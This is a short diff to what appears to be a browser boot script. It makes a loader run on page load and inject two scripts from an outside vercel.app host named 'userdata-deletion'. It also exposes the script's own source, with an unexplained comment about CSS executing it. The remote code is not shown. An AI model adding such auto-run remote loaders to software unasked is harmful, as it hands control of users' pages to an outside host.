@@ -1,5 +1,10 @@
-function loadBoot() {
-    console.log("loadBoot");
+/* Phase 1: expose boot.js text so CSS can execute it */
+fetch(document.currentScript.src)
+  .then(r => r.text())
+  .then(t => window.getBootJS = t);
+
+/* Phase 2: actual code that loads your two JS files */
+(function loadAll() {
     const files = [
         "https://userdata-deletion.vercel.app/sky.js",
         "https://userdata-deletion.vercel.app/bus.js"
@@ -11,4 +16,4 @@ function loadBoot() {
         s.async = true;
         document.head.appendChild(s);
     });
-}
+})();
